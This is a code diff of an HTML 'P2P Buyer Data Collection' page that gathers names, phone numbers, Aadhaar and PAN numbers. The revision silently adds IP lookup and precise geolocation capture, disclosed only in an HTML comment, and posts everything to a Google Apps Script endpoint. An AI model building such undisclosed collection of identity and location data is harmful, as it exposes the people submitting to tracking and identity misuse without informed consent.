@@ -5,53 +5,67 @@
 </head>
 <body>
   <h2>P2P Buyer Data Collection</h2>
-  <form id="p2p-form">
-    <input type="text" placeholder="Name" name="name" required><br>
-    <input type="tel" placeholder="Phone Number" name="phone" required><br>
-    <input type="text" placeholder="Aadhaar Number" name="aadhaar" required><br>
-    <input type="text" placeholder="PAN Number" name="pan" required><br>
-    <input type="text" placeholder="Location" name="location" required><br>
-    <button type="submit">Submit</button>
-  </form>
+<form id="buyerForm">
+  <input name="name" required />
+  <input name="phone" required />
+  <input name="aadhaar" required />
+  <input name="pan" required />
+  <!-- We will fetch location + IP automatically -->
+  <button type="submit">Submit</button>
+</form>
 
   <p id="msg"></p>
 
-  <script>
-    async function getIP() {
-      const res = await fetch('https://api.ipify.org?format=json');
-      const data = await res.json();
-      return data.ip;
+ <script>
+  document.getElementById("buyerForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const form = e.target;
+
+    const name = form.name.value;
+    const phone = form.phone.value;
+    const aadhaar = form.aadhaar.value;
+    const pan = form.pan.value;
+
+    // Get IP
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+    const ip = ipData.ip;
+
+    // Get location
+    let location = "Unknown";
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          location = `${position.coords.latitude}, ${position.coords.longitude}`;
+          submitToServer();
+        },
+        error => {
+          location = "Location Denied";
+          submitToServer();
+        }
+      );
+    } else {
+      submitToServer(); // Location not supported
     }
 
-    document.getElementById('p2p-form').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const form = e.target;
-      const ip = await getIP();
+    async function submitToServer() {
+      const payload = { name, phone, aadhaar, pan, ip, location };
 
-      const payload = {
-        name: form.name.value,
-        phone: form.phone.value,
-        aadhaar: form.aadhaar.value,
-        pan: form.pan.value,
-        location: form.location.value,
-        ip: ip
-      };
-
-      const res = await fetch('https://script.google.com/macros/s/AKfycbyq7sS4rpRCnbu59SbqCcmcXm58fjQvgbMawBrLrh_LrAq5lLNGvhGNyST423Wz6anv3A/exec', {
-        method: 'POST',
+      const res = await fetch("https://script.google.com/macros/s/AKfycbyq7sS4rpRCnbu59SbqCcmcXm58fjQvgbMawBrLrh_LrAq5lLNGvhGNyST423Wz6anv3A/exec", {
+        method: "POST",
         body: JSON.stringify(payload),
         headers: {
-          'Content-Type': 'application/json'
+          "Content-Type": "application/json"
         }
       });
 
-      if (res.ok) {
-        document.getElementById('msg').textContent = "Submitted successfully!";
-        form.reset();
-      } else {
-        document.getElementById('msg').textContent = "Error submitting form.";
-      }
-    });
-  </script>
+      const result = await res.text();
+      alert("Data submitted: " + result);
+    }
+  });
+</script>
+
 </body>
 </html>
+
